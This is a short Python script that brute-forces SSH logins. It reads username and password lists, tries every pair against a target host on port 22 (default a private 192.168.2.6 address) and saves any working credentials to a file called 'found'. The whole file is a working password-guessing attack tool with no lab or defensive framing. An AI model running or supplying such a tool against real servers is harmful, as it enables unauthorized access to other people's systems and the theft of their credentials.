import paramiko
import argparse
import socket


def brute_force(ip, port, user, passwd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(hostname=ip, port=port, username=user, password=passwd, timeout=3)
    except paramiko.AuthenticationException:
        print("[-] Authentication failed")
    except socket.timeout:
        print("[-] Timeout error")
    except paramiko.SSHException:
        print("[-] SSH connection error")
    else:
        print(f"[+] Password found: {user}:{passwd}")
        with open("found", 'a') as f_found:
            f_found.write(f"{ip}:{port} - {user}:{passwd}\n")
            f_found.flush()
    finally:
        client.close()


if __name__ == "__main__":
    arg_parser = argparse.ArgumentParser()

    arg_parser.add_argument("-f", "--filepath", help="path to the pass list")
    arg_parser.add_argument("-t", "--target", help="target ip")

    args = arg_parser.parse_args()

    userlist = "userlist.txt"
    passlist = "password.txt"
    target = "192.168.2.6"

    if args.filepath:
        passlist = args.filepath

    if args.target:
        target = args.target

    with open(userlist, 'r') as user_list:
        for u_line in user_list:
            username = u_line.strip()
            with open(passlist, 'r') as f:
                for p_line in f:
                    password = p_line.strip()
                    brute_force(ip=target, port=22, user=username, passwd=password)














